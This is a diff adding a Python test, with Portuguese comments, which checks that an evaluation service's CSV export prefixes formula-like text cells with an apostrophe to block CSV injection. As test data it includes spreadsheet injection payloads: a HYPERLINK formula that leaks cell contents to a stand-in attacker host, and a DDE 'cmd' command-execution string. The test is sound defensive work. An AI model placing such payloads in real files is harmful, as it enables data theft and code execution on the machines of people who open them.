@@ -284,6 +284,57 @@ async def test_export_csv_traz_todas_as_samples_com_scores(
     assert second["score_fidelity"] == ""
 
 
+async def test_export_csv_neutraliza_formula_em_celula_de_texto(
+    client: AsyncClient, db_session: AsyncSession
+) -> None:
+    """Célula que a planilha executaria como fórmula sai prefixada com apóstrofo.
+
+    `input`/`expected_output` vêm do dataset e `actual_output`/`judge_reasoning`
+    da saída do modelo avaliado — nada disso é confiável. Sem a neutralização,
+    abrir o CSV no Excel/Sheets executa a fórmula da célula (CSV injection).
+    """
+    created = await client.post("/v1/datasets", json={"name": "ds-injecao", "description": ""})
+    dataset_id = created.json()["id"]
+    samples = await client.post(
+        f"/v1/datasets/{dataset_id}/samples",
+        json=[
+            {
+                "input": '=HYPERLINK("http://atacante/?x="&A1,"clique")',
+                "expected_output": "+1+1",
+            }
+        ],
+    )
+    sample_id = samples.json()["ids"][0]
+    run_id = await _make_run(db_session, dataset_id)
+
+    db_session.add(
+        EvaluationResult(
+            run_id=uuid.UUID(run_id),
+            sample_id=uuid.UUID(sample_id),
+            actual_output="=cmd|' /C calc'!A0",
+            score_overall=0.5,
+            judge_reasoning="@SUM(1+1)",
+        )
+    )
+    await db_session.commit()
+
+    response = await client.get(f"/v1/results/{run_id}/export")
+    assert response.status_code == 200, response.text
+
+    rows = list(csv.reader(io.StringIO(response.text)))
+    row = dict(zip(_CSV_COLUMNS, rows[1], strict=True))
+
+    # Cada célula de texto começa com o marcador de "texto" da planilha e o
+    # conteúdo original fica intacto logo depois (nada é descartado).
+    assert row["input"] == '\'=HYPERLINK("http://atacante/?x="&A1,"clique")'
+    assert row["expected_output"] == "'+1+1"
+    assert row["actual_output"] == "'=cmd|' /C calc'!A0"
+    assert row["judge_reasoning"] == "'@SUM(1+1)"
+    # Score é número de verdade: continua sem apóstrofo, senão a planilha
+    # deixaria de somar/mediar a coluna.
+    assert row["score_overall"] == "0.5000"
+
+
 async def test_export_csv_returns_404_for_unknown_run(client: AsyncClient) -> None:
     response = await client.get(f"/v1/results/{uuid.uuid4()}/export")
     assert response.status_code == 404
